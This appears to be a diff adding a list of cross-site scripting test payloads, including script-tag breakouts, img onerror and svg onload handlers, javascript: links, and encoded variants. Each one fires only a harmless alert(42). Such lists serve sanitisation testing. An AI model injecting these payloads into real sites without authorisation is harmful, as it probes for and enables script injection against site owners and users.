@@ -1,0 +1,24 @@
+'/*<a/*>/*/alert/*<!--></style></script><script>/**/(alErT)(42)/**/</script>
+'); aleRt(String.fromCharCode(52, 50))//\'; ALERt(String.fromCharCode(52, 50))//"; aLerT(String.fromCharCode(52, 50))//\"; AleRt(String.fromCharCode(52, 50))//--></ScRipt>">'><sCripT>ALeRt(String.fromCharCode(52, 50))</scRIPt>
+`${(function(){alert("42")})()}`
+"><script>alert('42')</script>
+%3Cscript%3Ealert('42')%3C/script%3E
+';alert(String.fromCharCode(52, 50))//\
+<img src=x onerror=alert('42')>
+<svg onload=alert('42')>
+`"><script>alert('42')</script>`
+`%3Cscript%3Ealert('42')%3C/script%3E`
+`';alert(String.fromCharCode(52, 50))//\`
+`<img src=x onerror=alert('42')>`
+`<svg onload=alert('42')>`
+"><img src=x onerror=alert('42')>
+'';!--"<42>=&{()}
+`'';!--"<42>=&{()}`
+'`"><svg/onload=alert('42')>`
+';alert(String.fromCharCode(52, 50))//\
+&lt;img src=x onerror=alert('42')&gt;
+&#x3C;script&#x3E;alert('42')&#x3C;/script&#x3E;
+&nbsp;<a href="javascript:alert('42')">click me</a>
+&#x3C;img src=x onerror=alert('42')&#x3E;
+</textarea><script>alert(String.fromCharCode(52, 50))</script>
+&#x3C;console.log(String.fromCharCode(52, 50));&#x3E;
